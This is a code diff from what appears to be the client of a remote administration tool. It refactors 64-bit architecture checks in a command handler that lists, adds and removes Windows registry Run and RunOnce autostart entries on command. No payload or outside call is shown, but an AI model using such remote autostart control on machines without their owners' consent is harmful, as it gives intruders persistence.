@@ -5,11 +5,10 @@ using System.IO;
 using System.Linq;
 using System.Windows.Forms;
 using Microsoft.Win32;
-using xClient.Core.Information;
-using xClient.Core.RemoteShell;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
 using xClient.Enums;
 
 namespace xClient.Core.Commands
@@ -111,7 +110,7 @@ namespace xClient.Core.Commands
                         startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                     }
                 }
-                if (OSInfo.Bits == 64)
+                if (PlatformHelper.Architecture == 64)
                 {
                     using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                     {
@@ -192,7 +191,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (var key = Registry.LocalMachine.OpenWritableSubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
@@ -205,7 +204,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 5:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (var key = Registry.LocalMachine.OpenWritableSubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
@@ -291,7 +290,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (
@@ -305,7 +304,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 5:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (
